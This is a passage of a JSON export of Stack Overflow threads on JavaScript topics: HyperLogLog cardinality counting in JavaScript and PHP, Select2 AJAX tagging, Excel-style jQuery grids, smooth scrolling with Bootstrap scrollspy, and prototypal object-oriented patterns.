* m * m / c;\n\n            // -- make corrections\n\n            if (E &lt;= 5/2 * m)\n            {\n                 var V = 0;\n                 for (var i = 0; i &lt; m; ++i) if (M[i] == 0) ++V;\n                 if (V &gt; 0) E = m * Math.log(m / V);\n            }\n            else if (E &gt; 1/30 * pow_2_32)\n                 E = -pow_2_32 * Math.log(1 - E / pow_2_32);\n\n            // --\n\n            return E;\n        }\n    }\n\n    return {count: count, merge: merge, buckets: M};\n}\n\nfunction fnv1a(text)\n{\n    var hash = 2166136261;\n    for (var i = 0; i &lt; text.length; ++i)\n    {\n        hash ^= text.charCodeAt(i);\n        hash += (hash &lt;&lt; 1) + (hash &lt;&lt; 4) + (hash &lt;&lt; 7) +\n          (hash &lt;&lt; 8) + (hash &lt;&lt; 24);\n    }\n    return hash &gt;&gt;&gt; 0;\n}\n</code></pre>\n\n<p>Then you can do something like this:</p>\n\n<pre><code>// initialize one counter per day\nvar ll_monday = HyperLogLog(0.01);\nvar ll_tuesday = HyperLogLog(0.01);\nvar ll_wednesday = HyperLogLog(0.01);\n\n\n// add 5000 unique values in each day\nfor(var i=0; i&lt;5000; i++) ll_monday.count(fnv1a('' + Math.random()));\nfor(var i=0; i&lt;5000; i++) ll_tuesday.count(fnv1a('' + Math.random()));\nfor(var i=0; i&lt;5000; i++) ll_wednesday.count(fnv1a('' + Math.random()));\n\n// add 5000 values which appear every day\nfor(var i=0; i&lt;5000; i++) {ll_monday.count(fnv1a(''+i)); ll_tuesday.count(fnv1a('' + i));   ll_wednesday.count(fnv1a('' + i));}\n\n\n// merge three days together\ntogether = HyperLogLog(0.01);\ntogether.merge(ll_monday);\ntogether.merge(ll_tuesday);\ntogether.merge(ll_wednesday);\n\n// report\nconsole.log('unique per day: ' + Math.round(ll_monday.count()) + ' ' + Math.round(ll_tuesday.count()) + ' ' + Math.round(ll_wednesday.count()));\nconsole.log('unique numbers overall: ' + Math.round(together.count()));\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I know this is an old post but the @buryat implementation has moved, and is in any case incomplete, and a bit on the slow side (sorry o_o ). </p>\n\n<p>I've taken the implementation used by the new Redis release which can be found <a href=\"https://github.com/antirez/redis/blob/unstable/src/hyperloglog.c\" rel=\"nofollow\">here</a> and ported it to PHP. The repo is here <a href=\"https://github.com/joegreen0991/HyperLogLog\" rel=\"nofollow\">https://github.com/joegreen0991/HyperLogLog</a></p>\n\n<pre><code>&lt;?php\n\nclass HyperLogLog {\n\n    private $HLL_P_MASK;\n\n    private $HLL_REGISTERS;\n\n    private $ALPHA;\n\n    private $registers;\n\n    public function __construct($HLL_P = 14)\n    {\n        $this-&gt;HLL_REGISTERS = (1 &lt;&lt; $HLL_P); /* With P=14, 16384 registers. */\n\n        $this-&gt;HLL_P_MASK = ($this-&gt;HLL_REGISTERS - 1); /* Mask to index register. */\n\n        $this-&gt;ALPHA = 0.7213 / (1 + 1.079 / $this-&gt;HLL_REGISTERS);\n\n        $this-&gt;registers = new SplFixedArray($this-&gt;HLL_REGISTERS);\n\n        for ($i = 0; $i &lt; $this-&gt;HLL_REGISTERS; $i++) {\n            $this-&gt;registers[$i] = 0;\n        }\n    }\n\n    public function add($v)\n    {\n        $h = crc32(md5($v));\n\n        $h |= 1 &lt;&lt; 63; /* Make sure the loop terminates. */\n        $bit = $this-&gt;HLL_REGISTERS; /* First bit not used to address the register. */\n        $count = 1; /* Initialized to 1 since we count the \"00000...1\" pattern. */\n        while(($h &amp; $bit) == 0) {\n            $count++;\n            $bit &lt;&lt;= 1;\n        }\n\n        /* Update the register if this element produced a longer run of zeroes. */\n        $index = $h &amp; $this-&gt;HLL_P_MASK; /* Index a register inside registers. */\n\n        if ($this-&gt;registers[$index] &lt; $count) {\n            $this-&gt;registers[$index] = $count;\n        }\n    }\n\n    public function export()\n    {\n        $str = '';\n        for ($i = 0; $i &lt; $this-&gt;HLL_REGISTERS; $i++) {\n            $str .= chr($this-&gt;registers[$i]);\n        }\n        return $str;\n    }\n\n    public function import($str)\n    {\n        for ($i = 0; $i &lt; $this-&gt;HLL_REGISTERS; $i++) {\n            $this-&gt;registers[$i] = isset($str[$i]) ? ord($str[$i]) : 0;\n        }\n    }\n\n    public function merge($str)\n    {\n        for ($i = 0; $i &lt; $this-&gt;HLL_REGISTERS; $i++) {\n            if(isset($str[$i]))\n            {\n                $ord = ord($str[$i]);\n                if ($this-&gt;registers[$i] &lt; $ord) {\n                    $this-&gt;registers[$i] = $ord;\n                }\n            }\n\n        }\n    }\n\n    /**\n     * @static\n     * @param $arr\n     * @return int Number of unique items in $arr\n     */\n    public function count() {\n        $E = 0;\n\n        $ez = 0;\n\n        for ($i = 0; $i &lt; $this-&gt;HLL_REGISTERS; $i++) {\n            if ($this-&gt;registers[$i] !== 0) {\n                $E += (1.0 / pow(2, $this-&gt;registers[$i]));\n            } else {\n                $ez++;\n                $E += 1.0;\n            }\n        }\n\n        $E = (1 / $E) * $this-&gt;ALPHA * $this-&gt;HLL_REGISTERS * $this-&gt;HLL_REGISTERS;\n\n        /* Use the LINEARCOUNTING algorithm for small cardinalities.\n         * For larger values but up to 72000 HyperLogLog raw approximation is\n         * used since linear counting error starts to increase. However HyperLogLog\n         * shows a strong bias in the range 2.5*16384 - 72000, so we try to\n         * compensate for it. */\n        if ($E &lt; $this-&gt;HLL_REGISTERS * 2.5 &amp;&amp; $ez != 0) {\n            $E = $this-&gt;HLL_REGISTERS * log($this-&gt;HLL_REGISTERS / $ez);\n        }\n\n        else if ($this-&gt;HLL_REGISTERS == 16384 &amp;&amp; $E &lt; 72000) {\n            // We did polynomial regression of the bias for this range, this\n            // way we can compute the bias for a given cardinality and correct\n            // according to it. Only apply the correction for P=14 that's what\n            // we use and the value the correction was verified with.\n            $bias = 5.9119 * 1.0e-18 * ($E*$E*$E*$E)\n                -1.4253 * 1.0e-12 * ($E*$E*$E)+\n                1.2940 * 1.0e-7 * ($E*$E)\n                -5.2921 * 1.0e-3 * $E+\n                83.3216;\n            $E -= $E * ($bias/100);\n        }\n\n        return floor($E);\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Where can I find a valid implementation of <a href=\"http://algo.inria.fr/flajolet/Publications/DuFl03.pdf\">LogLog algorithm</a>? Have tried to implement it by myself but my draft implementation yields strange results.</p>\n\n<p><a href=\"http://jsfiddle.net/LCDLL/1/\">Here</a> it is:</p>\n\n<pre><code>function LogLog(max_error, max_count)\n{\n    function log2(x)\n    {\n         return Math.log(x) / Math.LN2;\n    }\n\n    var m = 1.30 / max_error;\n    var k = Math.ceil(log2(m * m));\n    m = Math.pow(2, k);\n\n    var k_comp = 32 - k;\n\n    var l = log2(log2(max_count / m));\n    if (isNaN(l)) l = 1; else l = Math.ceil(l);\n    var l_mask = ((1 &lt;&lt; l) - 1) &gt;&gt;&gt; 0;\n\n    var M = [];\n    for (var i = 0; i &lt; m; ++i) M[i] = 0;\n\n    function count(hash)\n    {\n          if (hash !== undefined)\n          {\n                var j = hash &gt;&gt;&gt; k_comp;\n\n                var rank = 0;\n                for (var i = 0; i &lt; k_comp; ++i)\n                {\n                     if ((hash &gt;&gt;&gt; i) &amp; 1)\n                     {\n                          rank = i + 1;\n                          break;\n                     }\n                }\n\n                M[j] = Math.max(M[j], rank &amp; l_mask);\n          }\n          else\n          {\n                var c = 0;\n                for (var i = 0; i &lt; m; ++i) c += M[i];\n                return 0.79402 * m * Math.pow(2, c / m);\n          }\n    }\n\n    return {count: count};\n}\n\nfunction fnv1a(text)\n{\n     var hash = 2166136261;\n     for (var i = 0; i &lt; text.length; ++i)\n     {\n          hash ^= text.charCodeAt(i);\n          hash += (hash &lt;&lt; 1) + (hash &lt;&lt; 4) + (hash &lt;&lt; 7) +\n            (hash &lt;&lt; 8) + (hash &lt;&lt; 24);\n     }\n    return hash &gt;&gt;&gt; 0;\n}\n\nvar words = ['aardvark', 'abyssinian', ... ,'zoology']; // about 2 300 words\n\nvar log_log = LogLog(0.01, 100000);\nfor (var i = 0; i &lt; words.length; ++i) log_log.count(fnv1a(words[i]));\nalert(log_log.count());\n</code></pre>\n\n<p>For unknown reason implementation is very sensitive to <code>max_error</code> parameter, it is the main factor that determines the magnitude of the result. I'm sure, there is some stupid mistake :)</p>\n\n<p><strong>UPDATE:</strong> This problem is solved in the <a href=\"http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf\">newer version</a> of algorithm. I will post its implementation later.</p>\n",
            "last_activity_date": 1423481951,
            "question_id": 5990713,
            "score": 55,
            "tags": [
                "javascript",
                "algorithm",
                "counting",
                "loglog",
                "hyperloglog"
            ],
            "title": "LogLog and HyperLogLog algorithms for counting of large cardinalities"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can make this work, by having your ajax function also return the search term, as the first result in the result list. The user can then select that result as a tag.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Select2 has the function \"createSearchChoice\":</p>\n\n<blockquote>\n  <p>Creates a new selectable choice from user's search term. Allows\n  creation of choices not available via the query function. Useful when\n  the user can create choices on the fly, eg for the 'tagging' usecase.</p>\n</blockquote>\n\n<p>You could achieve what you want by using:</p>\n\n<pre><code>createSearchChoice:function(term, data) {\n  if ($(data).filter(function() {\n    return this.text.localeCompare(term)===0;\n  }).length===0) {\n    return {id:term, text:term};\n  }\n},\nmultiple: true\n</code></pre>\n\n<p>Here's a more complete answer that returns a JSON result to an ajax search, and allows tags to be created from the term, if the term returned no results:</p>\n\n<pre><code>$(\".select2\").select2({\n  tags: true,\n  tokenSeparators: [\",\", \" \"],\n  createSearchChoice: function(term, data) {\n    if ($(data).filter(function() {\n      return this.text.localeCompare(term) === 0;\n    }).length === 0) {\n      return {\n        id: term,\n        text: term\n      };\n    }\n  },\n  multiple: true,\n  ajax: {\n    url: '/path/to/results.json',\n    dataType: \"json\",\n    data: function(term, page) {\n      return {\n        q: term\n      };\n    },\n    results: function(data, page) {\n      return {\n        results: data\n      };\n    }\n  }\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 71
                },
                {
                    "body": "<pre><code>createSearchChoice : function (term) { return {id: term, text: term}; }\n</code></pre>\n\n<p>just add this option item </p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Example with some improvements:</p>\n\n<p><a href=\"http://jsfiddle.net/X6V2s/66/\" rel=\"nofollow\">http://jsfiddle.net/X6V2s/66/</a></p>\n\n<p>html:</p>\n\n<pre><code>&lt;input type=\"hidden\" id=\"tags\" value=\"tag1,tag2\" style=\"width: 400px;\"&gt;\n</code></pre>\n\n<p>js:</p>\n\n<pre><code>$('#tags').select2({\n    tags: true,\n    tokenSeparators: [','],\n    createSearchChoice: function (term) {\n        return {\n            id: $.trim(term),\n            text: $.trim(term) + ' (new tag)'\n        };\n    },\n    ajax: {\n        url: 'https://api.myjson.com/bins/444cr',\n        dataType: 'json',\n        data: function(term, page) {\n            return {\n                q: term\n            };\n        },\n        results: function(data, page) {\n            return {\n                results: data\n            };\n        }\n    },\n\n    // Take default tags from the input value\n    initSelection: function (element, callback) {\n        var data = [];\n\n        function splitVal(string, separator) {\n            var val, i, l;\n            if (string === null || string.length &lt; 1) return [];\n            val = string.split(separator);\n            for (i = 0, l = val.length; i &lt; l; i = i + 1) val[i] = $.trim(val[i]);\n            return val;\n        }\n\n        $(splitVal(element.val(), \",\")).each(function () {\n            data.push({\n                id: this,\n                text: this\n            });\n        });\n\n        callback(data);\n    },\n\n    // Some nice improvements:\n\n    // max tags is 3\n    maximumSelectionSize: 3,\n\n    // override message for max tags\n    formatSelectionTooBig: function (limit) {\n        return \"Max tags is only \" + limit;\n    }\n});\n</code></pre>\n\n<p>JSON:</p>\n\n<pre><code>[\n  {\n    \"id\": \"tag1\",\n    \"text\": \"tag1\"\n  },\n  {\n    \"id\": \"tag2\",\n    \"text\": \"tag2\"\n  },\n  {\n    \"id\": \"tag3\",\n    \"text\": \"tag3\"\n  },\n  {\n    \"id\": \"tag4\",\n    \"text\": \"tag4\"\n  }\n]\n</code></pre>\n\n<p><strong>UPDATED 2015-01-22:</strong></p>\n\n<p>Fix jsfiddle: <a href=\"http://jsfiddle.net/X6V2s/66/\" rel=\"nofollow\">http://jsfiddle.net/X6V2s/66/</a></p>\n",
                    "is_accepted": false,
                    "score": 7
                }
            ],
            "body": "<p>I am doing tagging with <a href=\"http://ivaynberg.github.com/select2/#tags\">select2</a></p>\n\n<p>I have these requirements with select2:</p>\n\n<ol>\n<li>I need to search some tags using select2 ajax</li>\n<li>Also I need to use \"tags\" in select2 which Allows values that are not in the list(Ajax result).</li>\n</ol>\n\n<p>Both the scenarios work independently. But joined together aJax values are only populated. If we type any other values not in the list then it says \"no matches found\"</p>\n\n<p>My scenario If user type any new value which is not in the list, allow them to make up their own tag.</p>\n\n<p>Any way to make this work?</p>\n",
            "last_activity_date": 1421940654,
            "question_id": 14229768,
            "score": 41,
            "tags": [
                "javascript",
                "jquery",
                "jquery-select2"
            ],
            "title": "Tagging with AJAX in select2"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can check out following link:</p>\n\n<p><a href=\"http://roberto.open-lab.com/2010/01/30/javascript-grid-editor-i-want-to-be-excel/\">http://roberto.open-lab.com/2010/01/30/javascript-grid-editor-i-want-to-be-excel/</a></p>\n\n<p>In this post, the author of that blog has provided a review of several javascript spreadsheet-like functionality - according to the comments though, multi-cell copy/paste is still difficult. The reviewed products are: <a href=\"http://www.trirand.com/blog/\">jqGrid</a>, <a href=\"http://www.appelsiini.net/projects/jeditable\">Jeditable</a>, <a href=\"http://flexigrid.info/\">Flexgrid</a>, <a href=\"http://dreakmore.info/tgrid/demos/\">tgrid</a> and <a href=\"http://reconstrukt.com/ingrid/\">ingrid</a>.</p>\n\n<p>For details and opinions, you might like to check out that post.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>I needed JavaScript data grid with copy/paste compatibility with Excel. I could not find such, so I created this jQuery plugin: <a href=\"http://handsontable.com/\">http://handsontable.com/</a></p>\n\n<p>Maybe you will find it useful.</p>\n",
                    "is_accepted": true,
                    "score": 135
                },
                {
                    "body": "<p>there is one available on github: <a href=\"https://github.com/TanyaWebDesign/SpreadSheet\" rel=\"nofollow\">https://github.com/TanyaWebDesign/SpreadSheet</a></p>\n\n<p>it is based on jquery, has copy/paste and bunch of other functions.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The best way to deal with tabular data with jquery is probably using <a href=\"https://github.com/mleibman/SlickGrid/wiki/Examples\" rel=\"nofollow\">Slickgrid</a></p>\n\n<p>I did a plugin for copy/paste from/to excel:\n<a href=\"http://labs.nereo.com/SlickGrid/examples/example-excel-compatible-spreadsheet.html\" rel=\"nofollow\">http://labs.nereo.com/SlickGrid/examples/example-excel-compatible-spreadsheet.html</a></p>\n\n<p>The plugin has now many bugs fixed and features added by the community (eg. undo/redo support) :\n<a href=\"https://github.com/Celebio/SlickGrid/commits/master\" rel=\"nofollow\">https://github.com/Celebio/SlickGrid/commits/master</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I am looking for a jQuery plugin for something like spreadsheet or grid. \nI have found a lot of jQuery Grid <a href=\"http://stackoverflow.com/questions/159025/jquery-grid-recommendations\">plugins</a> and one spreadsheet <a href=\"http://visop-dev.com/Project+jQuery.sheet\">plugin</a>.\nBut I would like functionality with copy/paste cells from/to Excel. Something like <a href=\"http://www.developerextensions.com/index.php/extjs-excel-copypaste-grid\">here</a>  Any suggestions?  </p>\n",
            "last_activity_date": 1386241294,
            "question_id": 9019158,
            "score": 37,
            "tags": [
                "javascript",
                "jquery",
                "grid",
                "spreadsheet"
            ],
            "title": "jQuery Spreadsheet/Grid plugin with copy/paste from/to Excel"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Do you really need that plugin? You can just animate the <code>scrollTop</code> property:</p>\n\n<pre><code>$(\"#nav ul li a[href^='#']\").on('click', function(e) {\n\n   // prevent default anchor click behavior\n   e.preventDefault();\n\n   // store hash\n   var hash = this.hash;\n\n   // animate\n   $('html, body').animate({\n       scrollTop: $(hash).offset().top\n     }, 300, function(){\n\n       // when done, add hash to url\n       // (default click behaviour)\n       window.location.hash = hash;\n     });\n\n});\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/FyAnb/86/\">fiddle</a></p>\n",
                    "is_accepted": true,
                    "score": 112
                },
                {
                    "body": "<p>What <code>onetrickpony</code> posted is okay, but if you want to have a more general solution, you can just use the code below.</p>\n\n<p>Instead of selecting just the <code>id</code> of the anchor, you can make it bit more standard-like and just selecting the attribute <code>name</code> of the <code>&lt;a&gt;</code>-Tag. This will save you from writing an extra <code>id</code> tag. Just add the smoothscroll class to the navbar element.</p>\n\n<p><strong>What changed</strong></p>\n\n<p>1) <code>$('#nav ul li a[href^=\"#\"]')</code> to <code>$('#nav.smoothscroll ul li a[href^=\"#\"]')</code></p>\n\n<p>2) <code>$(this.hash)</code> to <code>$('a[name=\"' + this.hash.replace('#', '') + '\"]')</code></p>\n\n<p><strong>Final Code</strong></p>\n\n<pre><code>/* Enable smooth scrolling on all links with anchors */\n$('#nav.smoothscroll ul li a[href^=\"#\"]').on('click', function(e) {\n\n  // prevent default anchor click behavior\n  e.preventDefault();\n\n  // store hash\n  var hash = this.hash;\n\n  // animate\n  $('html, body').animate({\n    scrollTop: $('a[name=\"' + this.hash.replace('#', '') + '\"]').offset().top\n  }, 300, function(){\n\n    // when done, add hash to url\n    // (default click behaviour)\n    window.location.hash = hash;\n\n  });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If you have a fixed navbar, you'll need something like this. </p>\n\n<p>Taking from the best of the above answers and comments...</p>\n\n<pre><code>$(\".bs-js-navbar-scrollspy li a[href^='#']\").on('click', function(event) {\n  var target;\n  target = this.hash;\n\n  event.preventDefault();\n\n  var navOffset;\n  navOffset = $('#navbar').height();\n\n  return $('html, body').animate({\n    scrollTop: $(this.hash).offset().top - navOffset\n  }, 300, function() {\n    return window.history.pushState(null, null, target);\n  });\n});\n</code></pre>\n\n<p>First, in order to prevent the \"undefined\" error, store the hash to a variable, <code>target</code>, before calling <code>preventDefault()</code>, and later reference that stored value instead, as mentioned by pupadupa.</p>\n\n<p>Next. You cannot use <code>window.location.hash = target</code> because it sets the url and the location simultaneously rather than separately. You will end up having the location at the beginning of the element whose id matches the href... but covered by your fixed top navbar.</p>\n\n<p>In order to get around this, you set your scrollTop value to the vertical scroll location value of the target minus the height of your fixed navbar. Directly targeting that value maintains smooth scrolling, instead of adding an adjustment afterwards, and getting unprofessional-looking jitters.</p>\n\n<p>You will notice the url doesn't change. To set this, use <code>return window.history.pushState(null, null, target);</code> instead, to manually add the url to the history stack.</p>\n\n<p>Done!</p>\n\n<p>Other notes: </p>\n\n<p>1) using the <code>.on</code> method is the latest (as of Jan 2015) jquery method that is better than <code>.bind</code> or <code>.live</code>, or even <code>.click</code> for reasons I'll leave to you to find out.</p>\n\n<p>2) the navOffset value can be within the function or outside, but you will probably want it outside, as you may very well reference that vertical space for other functions / DOM manipulations. But I left it inside to make it neatly into one function.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>$(\"#YOUR-BUTTON\").on('click', function(e) {\n   e.preventDefault();\n   $('html, body').animate({\n        scrollTop: $(\"#YOUR-TARGET\").offset().top\n     }, 300);\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I've been trying to add a smooth scrolling function to my site for a while now but can't seem to get it to work.  </p>\n\n<p>Here is my HTML code relating to my navigation:</p>\n\n<pre><code>&lt;div id=\"nav-wrapper\"&gt;\n&lt;div id=\"nav\" class=\"navbar navbar-inverse affix-top\" data-spy=\"affix\" data-offset-top=\"675\"&gt;\n  &lt;div class=\"navbar-inner\" data-spy=\"affix-top\"&gt;\n    &lt;div class=\"container\"&gt;\n\n      &lt;!-- .btn-navbar is used as the toggle for collapsed navbar content --&gt;\n      &lt;a class=\"btn btn-navbar\" data-toggle=\"collapse\" data-target=\".nav-collapse\"&gt;\n        &lt;span class=\"icon-bar\"&gt;&lt;/span&gt;\n        &lt;span class=\"icon-bar\"&gt;&lt;/span&gt;\n        &lt;span class=\"icon-bar\"&gt;&lt;/span&gt;\n      &lt;/a&gt;\n\n      &lt;!-- Everything you want hidden at 940px or less, place within here --&gt;\n      &lt;div class=\"nav-collapse collapse\"&gt;\n        &lt;ul class=\"nav\"&gt;\n            &lt;li&gt;&lt;a href=\"#home\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"#service-top\"&gt;Services&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"#contact-arrow\"&gt;Contact&lt;/a&gt;&lt;/li&gt;\n        &lt;/ul&gt;&lt;!--/.nav--&gt;\n      &lt;/div&gt;&lt;!--/.nav-collapse collapse pull-right--&gt;\n    &lt;/div&gt;&lt;!--/.container--&gt;\n  &lt;/div&gt;&lt;!--/.navbar-inner--&gt;\n&lt;/div&gt;&lt;!--/#nav /.navbar navbar-inverse--&gt;\n&lt;/div&gt;&lt;!--/#nav-wrapper--&gt;\n</code></pre>\n\n<p>Here is the JS code I've added:</p>\n\n<pre><code>&lt;script src=\"js/jquery.scrollTo-1.4.3.1-min.js\"&gt;&lt;/script&gt;\n\n&lt;script&gt;\n    $(document).ready(function(e) {\n\n        $('#nav').scrollSpy()\n        $('#nav ul li a').bind('click', function(e) {\n            e.preventDefault();\n            target = this.hash;\n            console.log(target);\n            $.scrollTo(target, 1000);\n        });\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>For what it's worth, <a href=\"http://stackoverflow.com/questions/8711333/bootstrap-js-scrollspy-with-animated-scroll\">here</a> is where I received info on what I've done so far, and <a href=\"http://homegrowndevelopment.com/\">here</a> is my site in it's current form.  If you can help me I'll bake you a pie or cookies or something.  Thanks!</p>\n",
            "last_activity_date": 1424790120,
            "question_id": 14804941,
            "score": 27,
            "tags": [
                "javascript",
                "html",
                "css",
                "twitter-bootstrap",
                "smooth-scrolling"
            ],
            "title": "How to add smooth scrolling to Bootstrap&#39;s scroll spy function"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>I'm not exactly sure what you are looking for, but my current framework allows you to program in OO fashion like so:</p>\n\n<pre><code>Cin.define({\n    name: 'MyApp.Logger',\n    extends: 'Cin.Component',\n    implements: ['MyApp.ILogger'],\n    mixes: {\n        SomeMixin: 'MyApp.SomeMixin'\n    },\n\n    init: function() {\n    },\n\n    method: function() {\n    },\n\n    statics: {\n        staticMethod: function() {}\n    }\n});\n</code></pre>\n\n<p>And then you can write code like:</p>\n\n<pre><code>var instance = new MyApp.Logger();\ninstance.method();\n\nMyApp.Logger.staticMethod();\n</code></pre>\n\n<p>I am not trying to <em>emulate</em> classical OO here. I am trying to make a convenient and useful way to declare inheritance, mixins, interfaces, and general OO concepts so that it becomes easy for the developer to write such OO code. This also gives me the chance to finish my auto loading component so that you no longer take care of dependencies and you can make custom builds and enjoy faster development thanks to not needing to load 100 scripts per each page load.</p>\n\n<p>If you want to learn prototypical OO concepts, I think you should write some kind of inheritance system. Take a look at <a href=\"http://dojotoolkit.org/\" rel=\"nofollow\">Dojo Toolkit</a> or <a href=\"http://extjs.com\" rel=\"nofollow\">ExtJS</a>. A good thing to remember is that Prototype-based systems twist and mangle, they are more powerful than Class-based OO languages. In my opinion, there is no single right way to write prototypal code.</p>\n\n<p>I'm afraid though that most if not all inheritance systems might look like they emulate classical OO. In my opinion, my framework does not, but then it's not even finished.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"http://www.sencha.com/\" rel=\"nofollow\">ExtJS</a> is an excellent example of JavaScript OO. It implements a really sophisticated, enterprise-level OO hierarchy in JavaScript that does a lot of things out of the box. It may be a daunting read (last I checked in 3.X, it was over 1MB of raw, uncompressed JavaScript), but it'd give you a lot of ideas. You could start out by <a href=\"http://docs.sencha.com/ext-js/4-0/\" rel=\"nofollow\">reviewing the documentation</a> to get a high-level view.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Probably <a href=\"https://github.com/douglascrockford/JSLint\" rel=\"nofollow\">JSLint</a> (Crockford's a proponent of prototypical inheritance, but I haven't combed through every inch of it).  It's also looks more functional than Object Oriented, but then I expect that's generally the case with code that truly embraces prototypical inheritance.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You will not find it.</p>\n\n<p>I went looking for this sort of thing a while ago, and this is what I found: the <a href=\"http://labs.oracle.com/self/papers/organizing-programs.html\">Self Paper <em>Organizing Programs Without Classes</em></a> (Look at <a href=\"http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.56.8715\">Citeseer for a PDF version</a>.) This paper discusses the best practices for <em>Self</em>, the original prototypal language, and the best practice is to use the \"traits object idiom\", which is to have your objects inherit from \"traits objects\" that contain only methods, and no object specific data. In other words, an object that is suspiciously like a class.</p>\n\n<p>Even the original prototypal language emulates classes.</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>Here is an example showing the basis of the OO programming that you are looking for.  Best real-world example would be jQuery probably.</p>\n\n<p>When learning JavaScript, you have to keep in mind that it is actually closer to Scheme than it is C or Java at its roots.  Basically it is Scheme in C's syntax. </p>\n\n<p>There is almost never a case where you should use \"new\" in JavaScript, especially if you are writing APIs.  It seems as the \"new\" operator was added in because it JavaScript was not sure about its prototypal framework.  For most of us that start programming with classical languages such as C, C++, and Java, this seems odd, as \"new\" is generally exactly what we are looking for, because it translates easily.</p>\n\n<p>Why shouldn't I use \"new\" you ask?  Well, due to the implementation of \"new\", you can inadvertently start wiping out your global data (which remember, is everything not in a function in JavaScript).  If you happen to fall prey to this, then you will not see any errors, or notifications, but only see unpredictable behavior in your program.  Also, it may or may not be clear as to what \"this\" actually is bound to within your \"class\".</p>\n\n<p>The wipe out your global memory without knowing it problem mainly occurs when you write a function that is intended to be called with \"new\" and the user does not use \"new\".  Hints why using it in APIs can lead to unhappy users.</p>\n\n<p>The correct way to object oriented \"classes\" and inheritance is to use JavaScript's most powerful attribute...the object.</p>\n\n<p>You can write a function to return an object to establish a \"class\".  Anything you put into this object (numbers, strings, methods, etc.) are all public properties of your \"class\".  Anything you write within your function that is not inside that object that is being returned, is private.</p>\n\n<p>To inherit from your \"class\", you can simply initialize your object that you will be returning to a your \"base class\" result and then extend its functionality.</p>\n\n<p>The following sections of code will show how to construct a base class with private and public variables, and the do 2 levels of inheritance.</p>\n\n<p><strong>Base Object</strong></p>\n\n<pre><code>//Base Object\nvar Animal = function(spec) {\n\n    //This is our output object\n    //Everything provided from 'spec' and\n    //everything not addded to 'that' will\n    //be 'private'. Everything added to\n    //'that' is 'public'.\n    var that = {};\n\n    //Private Methods\n    function extend(obj1,obj2) {\n        for(var key in obj2) {\n            obj1[key] = obj2[key];\n        }\n    }\n\n    //Private Variables\n    var defaults = {\n        name : 'Default Name',\n        food : 'Default Food',\n        saying : 'Default Saying',\n    }\n\n    extend(defaults,spec);\n\n    //Public Methods\n    that.name = function() {\n        return defaults.name;\n    }\n\n    that.eats = function() {\n        if(typeof(defaults.food) === 'string') {\n            return defaults.food;\n        } else if(typeof(defaults.food) === 'object') {\n            return defaults.food.join(', ');\n        }\n    }\n\n    that.says = function() {\n        return defaults.saying;\n    }\n\n    return that;\n}\n\nvar myAnimal = Animal();       //Create a new instance\nalert(myAnimal.name());        //Alerts 'Default Name'\nalert(myAnimal.eats());        //Alerts 'Default Food'\nalert(myAnimal.says());        //Alerts 'Default Saying'\nalert(myAnimal.saying);        //Alerts 'undefined'\n//alert(myAnimal.extend());    //Has No Method Error\n\nvar myAnimal2 = Animal({       //Create a new instance using a spec\n    name : 'Mike',\n    food : ['Chicken','Duck'],\n    saying : 'Rawr',\n});    \nalert(myAnimal2.name());        //Alerts 'Mike'\nalert(myAnimal2.eats());        //Alerts 'Chicken, Duck'\nalert(myAnimal2.says());        //Alerts 'Rawr'\n</code></pre>\n\n<p><strong>Inheritance</strong></p>\n\n<pre><code>//Inheritance Object\nvar Mammal = function(spec) {\n\n    //Private Methods\n\n    //Have to redefine this since\n    //I decided to use this as an\n    //example of a private method\n    function extend(obj1,obj2) {\n        for(var key in obj2) {\n            obj1[key] = obj2[key];\n        }\n    }\n\n    //Private Variables\n    //New list of defaults\n    var defaults = {\n        name : 'Mammal',\n        attributes : ['fur'],\n    }\n\n    extend(defaults,spec);\n\n    //Inherrit from our Animal Object\n    //Use Mammal defaults\n    var that = Animal(defaults);\n\n\n    that.attributes = function() {\n        if(typeof(defaults.attributes) === 'string') {\n            return defaults.attributes;\n        } else if(typeof(defaults.attributes) === 'object') {\n            return defaults.attributes.join(', ');\n        } else {\n            return false;\n        }\n    }\n\n    return that;\n}\n\n//Second-Level Inheritance\nvar Cat = function(spec) {\n\n    //Private Methods\n\n    //Have to redefine this since\n    //I decided to use this as an\n    //example of a private method\n    function extend(obj1,obj2) {\n        for(var key in obj2) {\n            obj1[key] = obj2[key];\n        }\n    }\n\n    //Private Variables\n    //New list of defaults\n    var defaults = {\n        name : 'Cat',\n        saying : 'Meow',\n        food : ['fish','birds','frogs','MeowMix'],\n        fur_color : 'Default Fur Color',\n        attributes : ['fur','claws','crazy eyes','long tail'],\n    }\n\n    extend(defaults,spec);\n\n    //Inherrit from our Mammal Object\n    //We use our defaults for the cat\n    var that = Mammal(defaults);\n\n    that.fur_color = function() {\n        return defaults.fur_color; \n    